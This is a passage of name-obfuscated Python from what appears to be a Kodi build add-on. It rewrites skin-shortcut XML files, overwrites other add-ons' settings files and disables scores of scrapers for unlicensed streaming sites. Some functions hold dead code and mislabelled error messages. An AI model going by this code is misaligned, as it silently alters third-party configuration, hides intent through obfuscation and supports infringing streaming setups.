		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1229
    with open (O0OOOO00000O0OO0O ,'w')as O0O000O0O000O00O0 :#line:1232
      O0O000O0O000O00O0 .write (OOOOO0OOO0O00OO00 )#line:1233
    O0OOOO00000O0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1237
    with open (O0OOOO00000O0OO0O ,'r')as O0O000O0O000O00O0 :#line:1238
      OOOOO0OOO0O00OO00 =O0O000O0O000O00O0 .read ()#line:1239
    OOOOO0OOO0O00OO00 =OOOOO0OOO0O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1257
    with open (O0OOOO00000O0OO0O ,'w')as O0O000O0O000O00O0 :#line:1260
      O0O000O0O000O00O0 .write (OOOOO0OOO0O00OO00 )#line:1261
    O0OOOO00000O0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1265
    with open (O0OOOO00000O0OO0O ,'r')as O0O000O0O000O00O0 :#line:1266
      OOOOO0OOO0O00OO00 =O0O000O0O000O00O0 .read ()#line:1267
    OOOOO0OOO0O00OO00 =OOOOO0OOO0O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1285
    with open (O0OOOO00000O0OO0O ,'w')as O0O000O0O000O00O0 :#line:1288
      O0O000O0O000O00O0 .write (OOOOO0OOO0O00OO00 )#line:1289
    O0OOOO00000O0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1292
    with open (O0OOOO00000O0OO0O ,'r')as O0O000O0O000O00O0 :#line:1293
      OOOOO0OOO0O00OO00 =O0O000O0O000O00O0 .read ()#line:1294
    OOOOO0OOO0O00OO00 =OOOOO0OOO0O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1312
    with open (O0OOOO00000O0OO0O ,'w')as O0O000O0O000O00O0 :#line:1315
      O0O000O0O000O00O0 .write (OOOOO0OOO0O00OO00 )#line:1316
    O0OOOO00000O0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1318
    with open (O0OOOO00000O0OO0O ,'r')as O0O000O0O000O00O0 :#line:1319
      OOOOO0OOO0O00OO00 =O0O000O0O000O00O0 .read ()#line:1320
    OOOOO0OOO0O00OO00 =OOOOO0OOO0O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1338
    with open (O0OOOO00000O0OO0O ,'w')as O0O000O0O000O00O0 :#line:1341
      O0O000O0O000O00O0 .write (OOOOO0OOO0O00OO00 )#line:1342
    O0OOOO00000O0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1344
    with open (O0OOOO00000O0OO0O ,'r')as O0O000O0O000O00O0 :#line:1345
      OOOOO0OOO0O00OO00 =O0O000O0O000O00O0 .read ()#line:1346
    OOOOO0OOO0O00OO00 =OOOOO0OOO0O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1364
    with open (O0OOOO00000O0OO0O ,'w')as O0O000O0O000O00O0 :#line:1367
      O0O000O0O000O00O0 .write (OOOOO0OOO0O00OO00 )#line:1368
    O0OOOO00000O0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1371
    with open (O0OOOO00000O0OO0O ,'r')as O0O000O0O000O00O0 :#line:1372
      OOOOO0OOO0O00OO00 =O0O000O0O000O00O0 .read ()#line:1373
    OOOOO0OOO0O00OO00 =OOOOO0OOO0O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1391
    with open (O0OOOO00000O0OO0O ,'w')as O0O000O0O000O00O0 :#line:1394
      O0O000O0O000O00O0 .write (OOOOO0OOO0O00OO00 )#line:1395
def rdbuildinstallON ():#line:1398
    try :#line:1400
       OO0O0O000OOOO0000 =ADDONPATH +"/resources/rd/victory.xml"#line:1401
       O0OO0O0OOOOO00OOO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1402
       copyfile (OO0O0O000OOOO0000 ,O0OO0O0OOOOO00OOO )#line:1404
       OO0O0O000OOOO0000 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1406
       O0OO0O0OOOOO00OOO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1407
       copyfile (OO0O0O000OOOO0000 ,O0OO0O0OOOOO00OOO )#line:1409
       OO0O0O000OOOO0000 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1411
       O0OO0O0OOOOO00OOO =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1412
       copyfile (OO0O0O000OOOO0000 ,O0OO0O0OOOOO00OOO )#line:1414
       OO0O0O000OOOO0000 =ADDONPATH +"/resources/rd/Splash.png"#line:1417
       O0OO0O0OOOOO00OOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1418
       copyfile (OO0O0O000OOOO0000 ,O0OO0O0OOOOO00OOO )#line:1420
    except :#line:1422
       pass #line:1423
def rdbuild ():#line:1433
	O000OO0000O0O0O0O =(ADDON .getSetting ("auto_rd"))#line:1434
	if O000OO0000O0O0O0O =='true':#line:1435
		O0OO0OOO000OOO0OO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1436
		O0OO0OOO000OOO0OO .setSetting ('all_t','0')#line:1437
		O0OO0OOO000OOO0OO .setSetting ('rd_menu_enable','false')#line:1438
		O0OO0OOO000OOO0OO .setSetting ('magnet_bay','false')#line:1439
		O0OO0OOO000OOO0OO .setSetting ('magnet_extra','false')#line:1440
		O0OO0OOO000OOO0OO .setSetting ('rd_only','false')#line:1441
		O0OO0OOO000OOO0OO .setSetting ('ftp','false')#line:1443
		O0OO0OOO000OOO0OO .setSetting ('fp','false')#line:1444
		O0OO0OOO000OOO0OO .setSetting ('filter_fp','false')#line:1445
		O0OO0OOO000OOO0OO .setSetting ('fp_size_en','false')#line:1446
		O0OO0OOO000OOO0OO .setSetting ('afdah','false')#line:1447
		O0OO0OOO000OOO0OO .setSetting ('ap2s','false')#line:1448
		O0OO0OOO000OOO0OO .setSetting ('cin','false')#line:1449
		O0OO0OOO000OOO0OO .setSetting ('clv','false')#line:1450
		O0OO0OOO000OOO0OO .setSetting ('cmv','false')#line:1451
		O0OO0OOO000OOO0OO .setSetting ('dl20','false')#line:1452
		O0OO0OOO000OOO0OO .setSetting ('esc','false')#line:1453
		O0OO0OOO000OOO0OO .setSetting ('extra','false')#line:1454
		O0OO0OOO000OOO0OO .setSetting ('film','false')#line:1455
		O0OO0OOO000OOO0OO .setSetting ('fre','false')#line:1456
		O0OO0OOO000OOO0OO .setSetting ('fxy','false')#line:1457
		O0OO0OOO000OOO0OO .setSetting ('genv','false')#line:1458
		O0OO0OOO000OOO0OO .setSetting ('getgo','false')#line:1459
		O0OO0OOO000OOO0OO .setSetting ('gold','false')#line:1460
		O0OO0OOO000OOO0OO .setSetting ('gona','false')#line:1461
		O0OO0OOO000OOO0OO .setSetting ('hdmm','false')#line:1462
		O0OO0OOO000OOO0OO .setSetting ('hdt','false')#line:1463
		O0OO0OOO000OOO0OO .setSetting ('icy','false')#line:1464
		O0OO0OOO000OOO0OO .setSetting ('ind','false')#line:1465
		O0OO0OOO000OOO0OO .setSetting ('iwi','false')#line:1466
		O0OO0OOO000OOO0OO .setSetting ('jen_free','false')#line:1467
		O0OO0OOO000OOO0OO .setSetting ('kiss','false')#line:1468
		O0OO0OOO000OOO0OO .setSetting ('lavin','false')#line:1469
		O0OO0OOO000OOO0OO .setSetting ('los','false')#line:1470
		O0OO0OOO000OOO0OO .setSetting ('m4u','false')#line:1471
		O0OO0OOO000OOO0OO .setSetting ('mesh','false')#line:1472
		O0OO0OOO000OOO0OO .setSetting ('mf','false')#line:1473
		O0OO0OOO000OOO0OO .setSetting ('mkvc','false')#line:1474
		O0OO0OOO000OOO0OO .setSetting ('mjy','false')#line:1475
		O0OO0OOO000OOO0OO .setSetting ('hdonline','false')#line:1476
		O0OO0OOO000OOO0OO .setSetting ('moviex','false')#line:1477
		O0OO0OOO000OOO0OO .setSetting ('mpr','false')#line:1478
		O0OO0OOO000OOO0OO .setSetting ('mvg','false')#line:1479
		O0OO0OOO000OOO0OO .setSetting ('mvl','false')#line:1480
		O0OO0OOO000OOO0OO .setSetting ('mvs','false')#line:1481
		O0OO0OOO000OOO0OO .setSetting ('myeg','false')#line:1482
		O0OO0OOO000OOO0OO .setSetting ('ninja','false')#line:1483
		O0OO0OOO000OOO0OO .setSetting ('odb','false')#line:1484
		O0OO0OOO000OOO0OO .setSetting ('ophd','false')#line:1485
		O0OO0OOO000OOO0OO .setSetting ('pks','false')#line:1486
		O0OO0OOO000OOO0OO .setSetting ('prf','false')#line:1487
		O0OO0OOO000OOO0OO .setSetting ('put18','false')#line:1488
		O0OO0OOO000OOO0OO .setSetting ('req','false')#line:1489
		O0OO0OOO000OOO0OO .setSetting ('rftv','false')#line:1490
		O0OO0OOO000OOO0OO .setSetting ('rltv','false')#line:1491
		O0OO0OOO000OOO0OO .setSetting ('sc','false')#line:1492
		O0OO0OOO000OOO0OO .setSetting ('seehd','false')#line:1493
		O0OO0OOO000OOO0OO .setSetting ('showbox','false')#line:1494
		O0OO0OOO000OOO0OO .setSetting ('shuid','false')#line:1495
		O0OO0OOO000OOO0OO .setSetting ('sil_gh','false')#line:1496
		O0OO0OOO000OOO0OO .setSetting ('spv','false')#line:1497
		O0OO0OOO000OOO0OO .setSetting ('subs','false')#line:1498
		O0OO0OOO000OOO0OO .setSetting ('tvs','false')#line:1499
		O0OO0OOO000OOO0OO .setSetting ('tw','false')#line:1500
		O0OO0OOO000OOO0OO .setSetting ('upto','false')#line:1501
		O0OO0OOO000OOO0OO .setSetting ('vel','false')#line:1502
		O0OO0OOO000OOO0OO .setSetting ('vex','false')#line:1503
		O0OO0OOO000OOO0OO .setSetting ('vidc','false')#line:1504
		O0OO0OOO000OOO0OO .setSetting ('w4hd','false')#line:1505
		O0OO0OOO000OOO0OO .setSetting ('wav','false')#line:1506
		O0OO0OOO000OOO0OO .setSetting ('wf','false')#line:1507
		O0OO0OOO000OOO0OO .setSetting ('wse','false')#line:1508
		O0OO0OOO000OOO0OO .setSetting ('wss','false')#line:1509
		O0OO0OOO000OOO0OO .setSetting ('wsse','false')#line:1510
		O0OO0OOO000OOO0OO =xbmcaddon .Addon ('plugin.video.speedmax')#line:1511
		O0OO0OOO000OOO0OO .setSetting ('debrid.only','true')#line:1512
		O0OO0OOO000OOO0OO .setSetting ('hosts.captcha','false')#line:1513
		O0OO0OOO000OOO0OO =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1514
		O0OO0OOO000OOO0OO .setSetting ('provider.123moviehd','false')#line:1515
		O0OO0OOO000OOO0OO .setSetting ('provider.300mbdownload','false')#line:1516
		O0OO0OOO000OOO0OO .setSetting ('provider.alltube','false')#line:1517
		O0OO0OOO000OOO0OO .setSetting ('provider.allucde','false')#line:1518
		O0OO0OOO000OOO0OO .setSetting ('provider.animebase','false')#line:1519
		O0OO0OOO000OOO0OO .setSetting ('provider.animeloads','false')#line:1520
		O0OO0OOO000OOO0OO .setSetting ('provider.animetoon','false')#line:1521
		O0OO0OOO000OOO0OO .setSetting ('provider.bnwmovies','false')#line:1522
		O0OO0OOO000OOO0OO .setSetting ('provider.boxfilm','false')#line:1523
		O0OO0OOO000OOO0OO .setSetting ('provider.bs','false')#line:1524
		O0OO0OOO000OOO0OO .setSetting ('provider.cartoonhd','false')#line:1525
		O0OO0OOO000OOO0OO .setSetting ('provider.cdahd','false')#line:1526
		O0OO0OOO000OOO0OO .setSetting ('provider.cdax','false')#line:1527
		O0OO0OOO000OOO0OO .setSetting ('provider.cine','false')#line:1528
		O0OO0OOO000OOO0OO .setSetting ('provider.cinenator','false')#line:1529
		O0OO0OOO000OOO0OO .setSetting ('provider.cmovieshdbz','false')#line:1530
		O0OO0OOO000OOO0OO .setSetting ('provider.coolmoviezone','false')#line:1531
		O0OO0OOO000OOO0OO .setSetting ('provider.ddl','false')#line:1532
		O0OO0OOO000OOO0OO .setSetting ('provider.deepmovie','false')#line:1533
		O0OO0OOO000OOO0OO .setSetting ('provider.ekinomaniak','false')#line:1534
		O0OO0OOO000OOO0OO .setSetting ('provider.ekinotv','false')#line:1535
		O0OO0OOO000OOO0OO .setSetting ('provider.filiser','false')#line:1536
		O0OO0OOO000OOO0OO .setSetting ('provider.filmpalast','false')#line:1537
		O0OO0OOO000OOO0OO .setSetting ('provider.filmwebbooster','false')#line:1538
		O0OO0OOO000OOO0OO .setSetting ('provider.filmxy','false')#line:1539
		O0OO0OOO000OOO0OO .setSetting ('provider.fmovies','false')#line:1540
		O0OO0OOO000OOO0OO .setSetting ('provider.foxx','false')#line:1541
		O0OO0OOO000OOO0OO .setSetting ('provider.freefmovies','false')#line:1542
		O0OO0OOO000OOO0OO .setSetting ('provider.freeputlocker','false')#line:1543
		O0OO0OOO000OOO0OO .setSetting ('provider.furk','false')#line:1544
		O0OO0OOO000OOO0OO .setSetting ('provider.gamatotv','false')#line:1545
		O0OO0OOO000OOO0OO .setSetting ('provider.gogoanime','false')#line:1546
		O0OO0OOO000OOO0OO .setSetting ('provider.gowatchseries','false')#line:1547
		O0OO0OOO000OOO0OO .setSetting ('provider.hackimdb','false')#line:1548
		O0OO0OOO000OOO0OO .setSetting ('provider.hdfilme','false')#line:1549
		O0OO0OOO000OOO0OO .setSetting ('provider.hdmto','false')#line:1550
		O0OO0OOO000OOO0OO .setSetting ('provider.hdpopcorns','false')#line:1551
		O0OO0OOO000OOO0OO .setSetting ('provider.hdstreams','false')#line:1552
		O0OO0OOO000OOO0OO .setSetting ('provider.horrorkino','false')#line:1554
		O0OO0OOO000OOO0OO .setSetting ('provider.iitv','false')#line:1555
		O0OO0OOO000OOO0OO .setSetting ('provider.iload','false')#line:1556
		O0OO0OOO000OOO0OO .setSetting ('provider.iwaatch','false')#line:1557
		O0OO0OOO000OOO0OO .setSetting ('provider.kinodogs','false')#line:1558
		O0OO0OOO000OOO0OO .setSetting ('provider.kinoking','false')#line:1559
		O0OO0OOO000OOO0OO .setSetting ('provider.kinow','false')#line:1560
		O0OO0OOO000OOO0OO .setSetting ('provider.kinox','false')#line:1561
		O0OO0OOO000OOO0OO .setSetting ('provider.lichtspielhaus','false')#line:1562
		O0OO0OOO000OOO0OO .setSetting ('provider.liomenoi','false')#line:1563
		O0OO0OOO000OOO0OO .setSetting ('provider.magnetdl','false')#line:1566
		O0OO0OOO000OOO0OO .setSetting ('provider.megapelistv','false')#line:1567
		O0OO0OOO000OOO0OO .setSetting ('provider.movie2k-ac','false')#line:1568
		O0OO0OOO000OOO0OO .setSetting ('provider.movie2k-ag','false')#line:1569
		O0OO0OOO000OOO0OO .setSetting ('provider.movie2z','false')#line:1570
		O0OO0OOO000OOO0OO .setSetting ('provider.movie4k','false')#line:1571
		O0OO0OOO000OOO0OO .setSetting ('provider.movie4kis','false')#line:1572
		O0OO0OOO000OOO0OO .setSetting ('provider.movieneo','false')#line:1573
		O0OO0OOO000OOO0OO .setSetting ('provider.moviesever','false')#line:1574
		O0OO0OOO000OOO0OO .setSetting ('provider.movietown','false')#line:1575
		O0OO0OOO000OOO0OO .setSetting ('provider.mvrls','false')#line:1577
		O0OO0OOO000OOO0OO .setSetting ('provider.netzkino','false')#line:1578
		O0OO0OOO000OOO0OO .setSetting ('provider.odb','false')#line:1579
		O0OO0OOO000OOO0OO .setSetting ('provider.openkatalog','false')#line:1580
		O0OO0OOO000OOO0OO .setSetting ('provider.ororo','false')#line:1581
		O0OO0OOO000OOO0OO .setSetting ('provider.paczamy','false')#line:1582
		O0OO0OOO000OOO0OO .setSetting ('provider.peliculasdk','false')#line:1583
		O0OO0OOO000OOO0OO .setSetting ('provider.pelisplustv','false')#line:1584
		O0OO0OOO000OOO0OO .setSetting ('provider.pepecine','false')#line:1585
		O0OO0OOO000OOO0OO .setSetting ('provider.primewire','false')#line:1586
		O0OO0OOO000OOO0OO .setSetting ('provider.projectfreetv','false')#line:1587
		O0OO0OOO000OOO0OO .setSetting ('provider.proxer','false')#line:1588
		O0OO0OOO000OOO0OO .setSetting ('provider.pureanime','false')#line:1589
		O0OO0OOO000OOO0OO .setSetting ('provider.putlocker','false')#line:1590
		O0OO0OOO000OOO0OO .setSetting ('provider.putlockerfree','false')#line:1591
		O0OO0OOO000OOO0OO .setSetting ('provider.reddit','false')#line:1592
		O0OO0OOO000OOO0OO .setSetting ('provider.cartoonwire','false')#line:1593
		O0OO0OOO000OOO0OO .setSetting ('provider.seehd','false')#line:1594
		O0OO0OOO000OOO0OO .setSetting ('provider.segos','false')#line:1595
		O0OO0OOO000OOO0OO .setSetting ('provider.serienstream','false')#line:1596
		O0OO0OOO000OOO0OO .setSetting ('provider.series9','false')#line:1597
		O0OO0OOO000OOO0OO .setSetting ('provider.seriesever','false')#line:1598
		O0OO0OOO000OOO0OO .setSetting ('provider.seriesonline','false')#line:1599
		O0OO0OOO000OOO0OO .setSetting ('provider.seriespapaya','false')#line:1600
		O0OO0OOO000OOO0OO .setSetting ('provider.sezonlukdizi','false')#line:1601
		O0OO0OOO000OOO0OO .setSetting ('provider.solarmovie','false')#line:1602
		O0OO0OOO000OOO0OO .setSetting ('provider.solarmoviez','false')#line:1603
		O0OO0OOO000OOO0OO .setSetting ('provider.stream-to','false')#line:1604
		O0OO0OOO000OOO0OO .setSetting ('provider.streamdream','false')#line:1605
		O0OO0OOO000OOO0OO .setSetting ('provider.streamflix','false')#line:1606
		O0OO0OOO000OOO0OO .setSetting ('provider.streamit','false')#line:1607
		O0OO0OOO000OOO0OO .setSetting ('provider.swatchseries','false')#line:1608
		O0OO0OOO000OOO0OO .setSetting ('provider.szukajkatv','false')#line:1609
		O0OO0OOO000OOO0OO .setSetting ('provider.tainiesonline','false')#line:1610
		O0OO0OOO000OOO0OO .setSetting ('provider.tainiomania','false')#line:1611
		O0OO0OOO000OOO0OO .setSetting ('provider.tata','false')#line:1614
		O0OO0OOO000OOO0OO .setSetting ('provider.trt','false')#line:1615
		O0OO0OOO000OOO0OO .setSetting ('provider.tvbox','false')#line:1616
		O0OO0OOO000OOO0OO .setSetting ('provider.ultrahd','false')#line:1617
		O0OO0OOO000OOO0OO .setSetting ('provider.video4k','false')#line:1618
		O0OO0OOO000OOO0OO .setSetting ('provider.vidics','false')#line:1619
		O0OO0OOO000OOO0OO .setSetting ('provider.view4u','false')#line:1620
		O0OO0OOO000OOO0OO .setSetting ('provider.watchseries','false')#line:1621
		O0OO0OOO000OOO0OO .setSetting ('provider.xrysoi','false')#line:1622
		O0OO0OOO000OOO0OO .setSetting ('provider.library','false')#line:1623
def fixfont ():#line:1626
	O0000O0O0OO00OOO0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1627
	O0OO00O0OO0O0OOOO =json .loads (O0000O0O0OO00OOO0 );#line:1629
	OOOOO00O0OOO0O0OO =O0OO00O0OO0O0OOOO ["result"]["settings"]#line:1630
	OO000O0OO000OO000 =[O00OO00OOOOOOO00O for O00OO00OOOOOOO00O in OOOOO00O0OOO0O0OO if O00OO00OOOOOOO00O ["id"]=="audiooutput.audiodevice"][0 ]#line:1632
	O0OOO0O000OO0OOOO =OO000O0OO000OO000 ["options"];#line:1633
	OOO0OOO0O000O000O =OO000O0OO000OO000 ["value"];#line:1634
	OOOOO00OOOO000OOO =[O00OO00O000OO0O0O for (O00OO00O000OO0O0O ,OO000OO0OO0OOO00O )in enumerate (O0OOO0O000OO0OOOO )if OO000OO0OO0OOO00O ["value"]==OOO0OOO0O000O000O ][0 ];#line:1636
	OOOOOO00000OOO000 =(OOOOO00OOOO000OOO +1 )%len (O0OOO0O000OO0OOOO )#line:1638
	O0OOO00000OOO0O00 =O0OOO0O000OO0OOOO [OOOOOO00000OOO000 ]["value"]#line:1640
	OO0OOOOOOOOO0O00O =O0OOO0O000OO0OOOO [OOOOOO00000OOO000 ]["label"]#line:1641
	O0OO0O0O0OO0OOOOO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1643
	try :#line:1645
		O0O0O0000000000OO =json .loads (O0OO0O0O0OO0OOOOO );#line:1646
		if O0O0O0000000000OO ["result"]!=True :#line:1648
			raise Exception #line:1649
	except :#line:1650
		sys .stderr .write ("Error switching audio output device")#line:1651
		raise Exception #line:1652
def parseDOM2 (O0000O0OOO0OOO0OO ,name =u"",attrs ={},ret =False ):#line:1653
	if isinstance (O0000O0OOO0OOO0OO ,str ):#line:1656
		try :#line:1657
			O0000O0OOO0OOO0OO =[O0000O0OOO0OOO0OO .decode ("utf-8")]#line:1658
		except :#line:1659
			O0000O0OOO0OOO0OO =[O0000O0OOO0OOO0OO ]#line:1660
	elif isinstance (O0000O0OOO0OOO0OO ,unicode ):#line:1661
		O0000O0OOO0OOO0OO =[O0000O0OOO0OOO0OO ]#line:1662
	elif not isinstance (O0000O0OOO0OOO0OO ,list ):#line:1663
		return u""#line:1664
	if not name .strip ():#line:1666
		return u""#line:1667
	O00OOOOOOOO0OOO00 =[]#line:1669
	for O0000O0O00O0OO0O0 in O0000O0OOO0OOO0OO :#line:1670
		OOO0OO000O000OOO0 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O0000O0O00O0OO0O0 )#line:1671
		for OOO0OO00000OO0OO0 in OOO0OO000O000OOO0 :#line:1672
			O0000O0O00O0OO0O0 =O0000O0O00O0OO0O0 .replace (OOO0OO00000OO0OO0 ,OOO0OO00000OO0OO0 .replace ("\n"," "))#line:1673
		OO00OO00OO00O00O0 =[]#line:1675
		for OOOO0O0OO0000OO0O in attrs :#line:1676
			O0OO0O00OO0O00000 =re .compile ('(<'+name +'[^>]*?(?:'+OOOO0O0OO0000OO0O +'=[\'"]'+attrs [OOOO0O0OO0000OO0O ]+'[\'"].*?>))',re .M |re .S ).findall (O0000O0O00O0OO0O0 )#line:1677
			if len (O0OO0O00OO0O00000 )==0 and attrs [OOOO0O0OO0000OO0O ].find (" ")==-1 :#line:1678
				O0OO0O00OO0O00000 =re .compile ('(<'+name +'[^>]*?(?:'+OOOO0O0OO0000OO0O +'='+attrs [OOOO0O0OO0000OO0O ]+'.*?>))',re .M |re .S ).findall (O0000O0O00O0OO0O0 )#line:1679
			if len (OO00OO00OO00O00O0 )==0 :#line:1681
				OO00OO00OO00O00O0 =O0OO0O00OO0O00000 #line:1682
				O0OO0O00OO0O00000 =[]#line:1683
			else :#line:1684
				OO0O0OO0O0000OOO0 =range (len (OO00OO00OO00O00O0 ))#line:1685
				OO0O0OO0O0000OOO0 .reverse ()#line:1686
				for O0O0OOOO0O0O0O0O0 in OO0O0OO0O0000OOO0 :#line:1687
					if not OO00OO00OO00O00O0 [O0O0OOOO0O0O0O0O0 ]in O0OO0O00OO0O00000 :#line:1688
						del (OO00OO00OO00O00O0 [O0O0OOOO0O0O0O0O0 ])#line:1689
		if len (OO00OO00OO00O00O0 )==0 and attrs =={}:#line:1691
			OO00OO00OO00O00O0 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O0000O0O00O0OO0O0 )#line:1692
			if len (OO00OO00OO00O00O0 )==0 :#line:1693
				OO00OO00OO00O00O0 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O0000O0O00O0OO0O0 )#line:1694
		if isinstance (ret ,str ):#line:1696
			O0OO0O00OO0O00000 =[]#line:1697
			for OOO0OO00000OO0OO0 in OO00OO00OO00O00O0 :#line:1698
				O000OO000O0O00OOO =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OOO0OO00000OO0OO0 )#line:1699
				if len (O000OO000O0O00OOO )==0 :#line:1700
					O000OO000O0O00OOO =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OOO0OO00000OO0OO0 )#line:1701
				for O00OO0OO0O00OOO0O in O000OO000O0O00OOO :#line:1702
					OOOO00O000O0O0OO0 =O00OO0OO0O00OOO0O [0 ]#line:1703
					if OOOO00O000O0O0OO0 in "'\"":#line:1704
						if O00OO0OO0O00OOO0O .find ('='+OOOO00O000O0O0OO0 ,O00OO0OO0O00OOO0O .find (OOOO00O000O0O0OO0 ,1 ))>-1 :#line:1705
							O00OO0OO0O00OOO0O =O00OO0OO0O00OOO0O [:O00OO0OO0O00OOO0O .find ('='+OOOO00O000O0O0OO0 ,O00OO0OO0O00OOO0O .find (OOOO00O000O0O0OO0 ,1 ))]#line:1706
						if O00OO0OO0O00OOO0O .rfind (OOOO00O000O0O0OO0 ,1 )>-1 :#line:1708
							O00OO0OO0O00OOO0O =O00OO0OO0O00OOO0O [1 :O00OO0OO0O00OOO0O .rfind (OOOO00O000O0O0OO0 )]#line:1709
					else :#line:1710
						if O00OO0OO0O00OOO0O .find (" ")>0 :#line:1711
							O00OO0OO0O00OOO0O =O00OO0OO0O00OOO0O [:O00OO0OO0O00OOO0O .find (" ")]#line:1712
						elif O00OO0OO0O00OOO0O .find ("/")>0 :#line:1713
							O00OO0OO0O00OOO0O =O00OO0OO0O00OOO0O [:O00OO0OO0O00OOO0O .find ("/")]#line:1714
						elif O00OO0OO0O00OOO0O .find (">")>0 :#line:1715
							O00OO0OO0O00OOO0O =O00OO0OO0O00OOO0O [:O00OO0OO0O00OOO0O .find (">")]#line:1716
